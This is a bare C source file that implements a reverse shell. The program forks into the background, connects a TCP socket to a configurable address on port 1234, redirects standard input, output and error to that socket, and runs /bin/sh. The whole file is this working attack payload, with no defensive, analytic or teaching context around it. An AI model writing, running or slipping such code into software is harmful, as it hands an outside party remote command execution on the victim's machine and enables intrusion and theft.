#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define PORT 1234
#define CLIENT_IP "0.0.0.0"

int main()
{
    if (fork())
    {
        return EXIT_SUCCESS;
    }
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0)
    {
        abort();
    }
    struct sockaddr_in addr = {};
    addr.sin_family = AF_INET;
    addr.sin_port = ntohs(PORT);
    addr.sin_addr.s_addr = inet_addr(CLIENT_IP); 
    if (connect(fd, (struct sockaddr *) &addr, sizeof(addr)) != 0)
    {
	    abort();
    }
    dup2(fd, 0);
	dup2(fd, 1);
	dup2(fd, 2);
	char * const argv[] = {"/bin/sh", NULL};
	execve("/bin/sh", argv, NULL);
    return EXIT_SUCCESS;
}
